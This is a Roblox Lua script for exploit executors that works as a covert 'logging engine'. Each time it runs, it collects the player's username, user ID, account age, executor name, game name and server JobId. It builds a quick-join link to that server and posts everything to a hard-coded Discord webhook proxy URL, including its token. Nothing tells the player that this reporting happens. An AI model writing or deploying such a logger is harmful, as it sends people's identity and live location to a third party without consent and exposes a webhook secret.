local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
-- Webhook configuration
local WebhookURL = "https://webhook.lewisakura.moe/api/webhooks/1499988784572530733/rIU6D8j1ndcRcDC1yrQOlbRZ7mtedZKW85DWJgb28EDnp9dqrAC3P-kk-HcFizfPRF_n"

-- Data Gathering
local AccountName = LocalPlayer.Name
local UserId = LocalPlayer.UserId
local AccountAge = LocalPlayer.AccountAge .. " days"
local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
local GameId = game.PlaceId
local JobId = game.JobId

-- Fetch Game Name
local GameName = "Unknown Game"
pcall(function()
    GameName = MarketplaceService:GetProductInfo(GameId).Name
end)

-- Generate URLs
local PlayerThumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=420&height=420&format=png"
local GameThumbUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. GameId .. "&width=760&height=420&format=png"

-- Constructing the custom Redirect URL for your Vercel site
local WebsiteBase = "https://website-psi-lime-75.vercel.app/"
local JoinLink = WebsiteBase .. "?placeId=" .. GameId .. "&jobId=" .. JobId .. "&name=" .. HttpService:UrlEncode(GameName)

-- Constructing the Data Payload
local Data = {
    ["content"] = nil,
    ["embeds"] = {{
        ["title"] = "🎯 **New Execution Detected**",
        ["color"] = 0xFF0044, 
        ["fields"] = {
            { ["name"] = "👤 Player", ["value"] = "**" .. AccountName .. "** (" .. UserId .. ")", ["inline"] = true },
            { ["name"] = "⏳ Age", ["value"] = AccountAge, ["inline"] = true },
            { ["name"] = "🛠️ Executor", ["value"] = "Used: **" .. Executor .. "**", ["inline"] = false },
            { ["name"] = "🎮 Game", ["value"] = "[" .. GameName .. "](https://www.roblox.com/games/" .. GameId .. ")", ["inline"] = true },
            { ["name"] = "🆔 Server ID", ["value"] = "`" .. JobId .. "`", ["inline"] = false },
            -- The new Auto-Join field
            { ["name"] = "🔗 Quick Join", ["value"] = "[**Launch via " .. WebsiteBase:gsub("https://", ""):split(".")[1] .. "**](" .. JoinLink .. ")", ["inline"] = false }
        },
        ["thumbnail"] = { ["url"] = PlayerThumbUrl },
        ["image"] = { ["url"] = GameThumbUrl },
        ["footer"] = { ["text"] = "Logging Engine • " .. os.date("%X") },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

-- Send Logic
local Payload = HttpService:JSONEncode(Data)

if request then
    request({
        Url = WebhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = Payload
    })
else
    local success, err = pcall(function()
        HttpService:PostAsync(WebhookURL, Payload)
    end)
    if not success then warn("Webhook failed: " .. err) end
end
